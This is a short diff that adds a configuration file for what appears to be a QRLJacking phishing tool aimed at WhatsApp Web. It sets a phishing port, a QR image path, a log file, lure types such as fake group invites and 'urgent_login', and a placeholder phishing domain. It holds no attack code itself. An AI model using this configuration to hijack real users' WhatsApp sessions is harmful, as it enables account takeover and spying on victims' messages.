@@ -1,0 +1,6 @@
+target_url: "https://web.whatsapp.com"
+phishing_port: 1337
+qr_image_path: "static/qr_code.png"
+log_file: "logs/qrl_jacker.log"
+lure_type: "group_invite"  # Options: group_invite, channel_promo, urgent_login
+phishing_url: "https://yourdomain.com"  # Replace with your domain
